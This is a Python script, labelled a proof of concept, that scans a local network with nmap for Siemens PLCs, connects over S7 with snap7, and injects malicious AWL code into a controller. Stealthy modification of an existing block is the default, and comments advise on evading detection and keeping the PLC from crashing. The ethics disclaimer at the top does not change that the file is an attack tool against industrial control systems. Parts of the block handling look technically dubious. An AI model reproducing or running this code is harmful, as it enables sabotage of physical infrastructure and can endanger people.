# DISCLAIMER: This code is a proof-of-concept and should be used for ethical research and educational purposes only.
# Unauthorized access or modification of industrial control systems is illegal and can have serious consequences.
# The user is solely responsible for the safe and ethical use of this script.

import snap7
import snap7.client
import snap7.util
import socket
import struct
import subprocess
import time

# Configuration
PLC_RACK = 0
PLC_SLOT = 1
MALICIOUS_CODE_FILE = "malicious_code.awl"  # Replace with your malicious code file (AWL format)
TEMP_CODE_BLOCK_NAME = "MaliciousCode"   # Name of the temporary code block to create
BLOCK_NUMBER = 1000 # the Block that is going to be injected

# Function to find the PLC's IP address
def find_plc_ip():
    """
    Attempts to find the PLC's IP address by scanning the local network.
    This is a simplified approach and may not work in all network configurations.
    Requires nmap to be installed (apt install nmap or equivalent).

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    try:
        # Run nmap to scan the local network (adjust IP range if needed)
        result = subprocess.run(["nmap", "-sn", "192.168.1.0/24"], capture_output=True, text=True)
        output = result.stdout

        # Parse nmap output to find devices that might be a Siemens PLC
        for line in output.splitlines():
            if "Siemens" in line or "SIMATIC" in line:
                # Extract IP address from nmap output
                parts = line.split()
                if len(parts) > 4:
                    ip_address = parts[4]
                    print(f"Possible PLC IP address found: {ip_address}")
                    return ip_address

        print("No Siemens PLC detected by nmap on the network.")
        return None

    except FileNotFoundError:
        print("Error: nmap is not installed. Please install nmap and try again.")
        return None
    except Exception as e:
        print(f"Error during IP address discovery: {e}")
        return None



def read_awl_file(filename):
    """Reads the contents of an AWL file.

    Args:
        filename (str): The path to the AWL file.

    Returns:
        str: The contents of the AWL file as a string.
    """
    try:
        with open(filename, "r") as f:
            return f.read()
    except FileNotFoundError:
        print(f"Error: File not found: {filename}")
        return None
    except Exception as e:
        print(f"Error reading file: {e}")
        return None

def upload_block(plc, block_number):
    try:
        block = plc.upload(snap7.client.BLOCK_DB, block_number)
        print(f"Block {block_number} successfully uploaded.")
        return block
    except Exception as e:
        print(f"Error uploading block {block_number}: {e}")
        return None
def download_block(plc, block_number, block_data):
    """Downloads a block of code to the PLC.

    Args:
        plc (snap7.client.Client): The S7 client object.
        block_number (int): The block number to download.
        block_data (bytes): The block data to download.
    """
    try:
        plc.download(snap7.client.BLOCK_DB, block_number, block_data)
        print(f"Block {block_number} successfully downloaded.")
    except Exception as e:
        print(f"Error downloading block {block_number}: {e}")

def create_and_download_code_block(plc, block_name, awl_code):
    """Creates a new code block in the PLC and downloads the AWL code to it.

    Args:
        plc (snap7.client.Client): The S7 client object.
        block_name (str): The name of the new code block.
        awl_code (str): The AWL code to download to the block.
    """
    try:
        # Convert AWL code to bytes
        awl_bytes = awl_code.encode('utf-8')
        block_type = snap7.client.BLOCK_OB

        #Create the block
        plc.create_block(block_type, 1000, len(awl_bytes))

        # Download code to the block
        plc.download(block_type,1000,awl_bytes)
        print(f"Code block '{block_name}' created and code downloaded successfully.")

    except Exception as e:
        print(f"Error creating and downloading code block: {e}")

def modify_existing_code_block(plc, block_number, awl_code):
    """Modifies an existing code block in the PLC with new AWL code.

    Args:
        plc (snap7.client.Client): The S7 client object.
        block_number (int): The block number to modify.
        awl_code (str): The AWL code to inject into the block.  This should be crafted
                        to integrate seamlessly with the existing logic.
    """
    try:
        # 1.  Upload the existing block
        existing_block_data = upload_block(plc, block_number)
        if existing_block_data is None:
            return

        # 2.  Decode the existing block data (this is highly simplified and may not work for all block types)
        #     You'll likely need to understand the S7 block structure and use snap7.util to properly decode the data.
        #     For example, if the block contains strings, integers, etc., you need to extract those correctly.
        try:
            existing_code = existing_block_data.decode('utf-8', errors='ignore') # try to decode as UTF-8
        except UnicodeDecodeError:
            existing_code = ''.join(chr(i) for i in existing_block_data) # Fallback, decode each byte as char

        # 3. Inject the malicious code (Carefully craft your injection!)
        #This is a VERY basic example of injection.  In a real attack, you MUST understand the AWL code structure
        # to inject in a way that the PLC will execute the malicious code and not crash.  This is often done
        # by inserting JUMP instructions.
        modified_code = existing_code + "\n" + awl_code  # Append the malicious code.  VERY DANGEROUS

        # 4.  Encode and download the modified block
        modified_block_data = modified_code.encode('utf-8')
        download_block(plc, block_number, modified_block_data)

        print(f"Code block {block_number} modified successfully with malicious code.")

    except Exception as e:
        print(f"Error modifying code block: {e}")



def main():
    # 1. Find PLC IP address
    plc_ip_address = find_plc_ip()
    if not plc_ip_address:
        print("PLC IP address not found.  Exiting.")
        return

    # 2. Initialize S7 client
    plc = snap7.client.Client()

    try:
        plc.connect(plc_ip_address, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {plc_ip_address}")

        # 3. Read Malicious Code from File
        malicious_code = read_awl_file(MALICIOUS_CODE_FILE)
        if not malicious_code:
            return

        # 4. Inject code using one of the methods:

        # a)  Create and download a new code block (more easily detected)
        # create_and_download_code_block(plc, TEMP_CODE_BLOCK_NAME, malicious_code)

        # b)  Modify an existing code block (more stealthy, but requires deeper understanding of the existing code)
        modify_existing_code_block(plc, BLOCK_NUMBER, malicious_code)

    except Exception as e:
        print(f"Error: {e}")

    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    main()